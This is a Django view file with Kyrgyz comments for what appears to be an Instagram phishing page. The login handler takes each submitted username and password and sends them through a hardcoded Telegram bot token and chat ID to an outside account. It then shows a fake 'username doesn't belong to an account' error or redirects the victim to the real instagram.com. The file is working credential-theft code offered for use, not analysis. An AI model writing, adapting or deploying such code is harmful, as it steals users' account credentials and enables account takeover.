import requests
from django.shortcuts import render, redirect

# Телеграмга билдирүү жиберүүчү функция
def send_to_telegram(message):
    token = "8749010035:AAEJ7WHiSS5zPoYc8ubAvVQT_Zvg9Gnsf38" 
    chat_id = "7678418524"
    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}"
    try:
        requests.get(url)
    except Exception as e:
        print(f"Ката кетти: {e}")

def index(request):
    # Сессияда 'attempts' (аракеттер) жок болсо, 0 кылып түзөбүз
    if 'attempts' not in request.session:
        request.session['attempts'] = 0
        
    error_message = None
    
    if request.method == "POST":
        u_name = request.POST.get('username', '').strip()
        p_word = request.POST.get('password', '').strip()
        
        # Аракеттин санын көбөйтүү
        request.session['attempts'] += 1
        current_attempt = request.session['attempts']
        
        # 1. Телеграмга билдирүү даярдоо жана жиберүү
        # base.txt файлына жазбайбыз, анткени ал Render'де ката берет
        text = f"🚀 Жаңы маалымат!\nАракет №: {current_attempt}\nЛогин: {u_name}\nПароль: {p_word}"
        send_to_telegram(text)
        
        # 2. Шартыбыз: Эгер 2ден көп аракет болсо (3-жолу басылганда)
        if current_attempt >= 1:
            request.session['attempts'] = 0 # Сессияны нөлдөйбүз
            return redirect("https://www.instagram.com")
        else:
            # 1- жана 2- жолунда ката билдирүүсү чыгат
            error_message = "The username you entered doesn't appear to belong to an account. Please check your username and try again."
            
    return render(request, 'main/login.html', {'error': error_message})
